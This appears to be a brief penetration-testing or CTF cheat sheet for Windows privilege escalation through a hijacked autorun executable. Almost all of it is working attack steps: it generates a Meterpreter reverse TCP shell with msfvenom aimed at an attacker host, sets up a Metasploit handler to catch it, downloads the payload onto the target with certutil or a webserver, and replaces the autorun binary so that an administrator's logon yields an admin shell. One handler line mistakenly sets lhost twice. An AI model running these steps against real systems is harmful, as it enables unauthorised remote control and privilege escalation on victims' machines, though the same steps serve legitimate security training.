Create a reverse tcp shell with msfvenom:
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=<attacker-ip> lport=<attacker-port> -f exe -o revshell.exe
```

Start multi handler in msfconsole to catch the shell:
```bash
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost <attacker-ip>
set lhost <attacker-port>
run
```

Upload *revshell.exe* to the target machine.
File upload possibilities:
- Host file with python webserver on the attacker machine - Use internet explorer/certutils to download the program on the target machine

Replace the previously enumerated autorun executable with our reverse shell.

If an administrator user logs in the exe runs and gives us an administrative shell.